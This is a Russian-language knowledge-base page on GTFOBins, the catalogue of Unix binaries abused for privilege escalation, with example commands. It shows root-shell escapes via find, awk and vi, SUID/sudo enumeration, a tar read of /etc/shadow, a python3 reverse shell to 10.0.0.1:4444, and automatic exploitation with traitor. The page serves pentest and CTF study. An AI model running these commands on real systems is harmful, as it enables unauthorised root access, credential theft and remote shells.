# GTFOBins

## Definitions

**GTFOBins** ([gtfobins.github.io](https://gtfobins.github.io/)) — курируемый список Unix-бинарников, которые могут быть использованы для обхода локальных ограничений безопасности в неправильно настроенных системах.

Это **не инструмент**, а база знаний (сайт + GitHub-репозиторий), документирующая техники эксплуатации легитимных системных утилит.

## Basic Concepts

### Принцип работы

Каждая запись в GTFOBins описывает один бинарный файл и набор техник его нестандартного использования для:

- **Повышения привилегий** — получение root-доступа через SUID-бит, sudo-права, capabilities.
- **Пост-эксплуатации** — reverse shell, чтение/запись файлов, обход ограничений оболочки.
- **Обхода ограничений** — выполнение команд в restricted shell, передача файлов.

### Категории техник

GTFOBins классифицирует техники по контексту эксплуатации:

| Категория | Описание | Пример |
|---|---|---|
| **SUID** | Бинарник с SUID-битом выполняется от имени владельца (часто root) | `find . -exec /bin/sh \; -quit` |
| **sudo** | Запуск через `sudo` с расширенными возможностями | `sudo find . -exec /bin/sh \; -quit` |
| **Capabilities** | Linux capabilities (`cap_setuid`, `cap_dac_override`) | `python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'` (при `cap_setuid`) |
| **Docker** | Эксплуатация через контейнеры или writable `docker.sock` | Монтирование host-filesystem |
| **Restricted Shell** | Обход ограничений rbash, rssh | `vi` → `:!sh` |
| **File Read/Write** | Чтение/запись произвольных файлов через утилиту | `tar -cf /dev/null /etc/shadow --checkpoint=1` |
| **Shell Escape** | Получение полноценной оболочки из ограниченной | `awk 'BEGIN {system("/bin/sh")}'` |

### Связь с SUID-битом

SUID-бит — ключевой вектор для техник GTFOBins. Бинарник с SUID выполняется с правами владельца файла, что при наличии у утилиты возможности выполнения команд даёт root-доступ.

> **Подробно:** [Специальные права: SUID/SGID](../../Linux/Security/Concepts/File_Permissions/special_permissions.md) — механизм, безопасность, аудит.

## Practical Scenarios

### Поиск уязвимых бинарников

```bash
# Поиск файлов с SUID-битом
find / -type f -perm -4000 2>/dev/null

# Поиск файлов с SGID-битом
find / -type f -perm -2000 2>/dev/null

# Проверка sudo-прав текущего пользователя
sudo -l
```

Найденные бинарники сверяются с GTFOBins для определения возможных техник эксплуатации.

### Пример: эксплуатация `find`

Если `find` имеет SUID-бит или доступен через sudo:

```bash
# SUID-вариант
/usr/bin/find . -exec /bin/sh \; -quit

# sudo-вариант
sudo find . -exec /bin/sh \; -quit
```

### Пример: reverse shell через `python3`

При наличии sudo-доступа к `python3`:

```bash
sudo python3 -c 'import socket,subprocess,os; \
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); \
  s.connect(("10.0.0.1",4444)); \
  os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); \
  subprocess.call(["/bin/sh","-i"])'
```

### Пример: обход restricted shell через `vi`

```bash
vi
:!sh          # получение оболочки
:shell        # альтернативный способ
```

### Автоматизация с `traitor`

Инструмент [traitor](./traitor.md) автоматически сканирует систему и проверяет бинарники по техникам, аналогичным GTFOBins:

```bash
# Только поиск
traitor

# Поиск + эксплуатация
traitor -a
```

## Additional Information

### Применение

- **CTF-соревнования** — стандартный ресурс для задач на повышение привилегий.
- **Пентест** — быстрый поиск векторов эскалации при аудите.
- **Red Team** — справочник техник пост-эксплуатации.

### Интеграция с инструментами

GTFOBins служит источником техник для автоматизированных инструментов:

- [**traitor**](./traitor.md) — автоматический поиск и эксплуатацию уязвимостей.
- **LinPEAS**, **LinuxSmartEnumeration** — сканирование системы с проверкой техник GTFOBins.

### Ограничения

- **Не покрывает все векторы** — сложные, многоступенчатые атаки требуют ручного анализа.
- **Зависит от конфигурации** — техники работают только при наличии соответствующих прав (SUID, sudo, capabilities).
- **Не заменяет анализ** — автоматический поиск даёт только «низко висящие плоды».

### Связанные ресурсы

- [Специальные права: SUID/SGID](../../Linux/Security/Concepts/File_Permissions/special_permissions.md) — механизм SUID, аудит, безопасное монтирование.
- [traitor](./traitor.md) — автоматический поиск и эксплуатация техник, аналогичных GTFOBins.
- [Управление привилегиями](../../Linux/SystemAdministration/privilege_management.md) — системные вызовы `setuid()`, `seteuid()`, `setreuid()`.
